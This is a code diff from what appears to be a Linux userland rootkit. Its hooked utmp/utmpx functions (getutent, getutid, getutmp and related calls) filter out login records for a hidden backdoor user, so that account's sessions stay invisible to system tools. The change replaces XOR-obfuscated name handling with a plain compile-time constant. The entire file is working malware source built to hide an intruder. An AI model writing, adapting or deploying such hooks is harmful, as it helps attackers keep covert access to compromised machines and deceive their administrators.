@@ -9,131 +9,107 @@
  * See 'putut.c' for more information.
  */
 
-struct utmp *getutid(const struct utmp *ut)
-{
+struct utmp *getutid(const struct utmp *ut){
     struct utmp *tmp;
 
     hook(CGETUTID);
-    xor(bd_uname, BD_UNAME);
 
-    do {
+    do{
         tmp = call(CGETUTID, ut);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
-    
-    clean(bd_uname);
+    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));
+
     return tmp;
 }
 
-struct utmpx *getutxid(const struct utmpx *utx)
-{
+struct utmpx *getutxid(const struct utmpx *utx){
     struct utmpx *tmp;
 
     hook(CGETUTXID);
-    xor(bd_uname, BD_UNAME);
 
-    do {
+    do{
         tmp = call(CGETUTXID, utx);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
-    
-    clean(bd_uname);
+    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));
+
     return tmp;
 }
 
-struct utmp *getutline(const struct utmp *ut)
-{
+struct utmp *getutline(const struct utmp *ut){
     struct utmp *tmp;
 
     hook(CGETUTLINE);
-    xor(bd_uname, BD_UNAME);
 
-    do {
+    do{
         tmp = call(CGETUTLINE, ut);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
-    
-    clean(bd_uname);
+    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));
+
     return tmp;
 }
 
-struct utmpx *getutxline(const struct utmpx *utx)
-{
+struct utmpx *getutxline(const struct utmpx *utx){
     struct utmpx *tmp;
 
     hook(CGETUTXLINE);
-    xor(bd_uname, BD_UNAME);
 
     do {
         tmp = call(CGETUTXLINE, utx);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
-    
-    clean(bd_uname);
+    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));
+
     return tmp;
 }
 
-struct utmp *getutent(void)
-{
+struct utmp *getutent(void){
     struct utmp *tmp;
 
     hook(CGETUTENT);
-    xor(bd_uname, BD_UNAME);
 
-    do {
+    do{
         tmp = call(CGETUTENT);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
-    
-    clean(bd_uname);
+    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));
+
     return tmp;
 }
 
-struct utmpx *getutxent(void)
-{
+struct utmpx *getutxent(void){
     struct utmpx *tmp;
 
     hook(CGETUTXENT);
-    xor(bd_uname, BD_UNAME);
     
-    do {
+    do{
         tmp = call(CGETUTXENT);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
+    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));
 
-    clean(bd_uname);
     return tmp;
 }
 
-void getutmp(const struct utmpx *ux, struct utmp *u)
-{
+void getutmp(const struct utmpx *ux, struct utmp *u){
     if(hide_me) return;
 
-    if(ux && ux->ut_user != NULL)
-    {
-        xor(bd_uname, BD_UNAME);
-        if(!strncmp(ux->ut_user, bd_uname, sizeof(ux->ut_user))) hide_me = 1;
-        clean(bd_uname);
+    if(ux && ux->ut_user != NULL){
+        if(!strncmp(BD_UNAME, ux->ut_user, strlen(BD_UNAME)))
+            hide_me = 1;
     }
 
     if(hide_me) return;
     hook(CGETUTMP);
-    (void)call(CGETUTMP, ux, u);
+    call(CGETUTMP, ux, u);
     return;
 }
 
-void getutmpx(const struct utmp *u, struct utmpx *ux)
-{
+void getutmpx(const struct utmp *u, struct utmpx *ux){
     if(hide_me) return;
 
-    if(u && u->ut_user != NULL)
-    {
-        xor(bd_uname, BD_UNAME);
-        if(!strncmp(u->ut_user, bd_uname, sizeof(u->ut_user))) hide_me = 1;
-        clean(bd_uname);
+    if(u && u->ut_user != NULL){
+        if(!strncmp(BD_UNAME, u->ut_user, strlen(BD_UNAME)))
+            hide_me = 1;
     }
 
     if(hide_me) return;
     hook(CGETUTMPX);
-    (void)call(CGETUTMPX, u, ux);
+    call(CGETUTMPX, u, ux);
 }
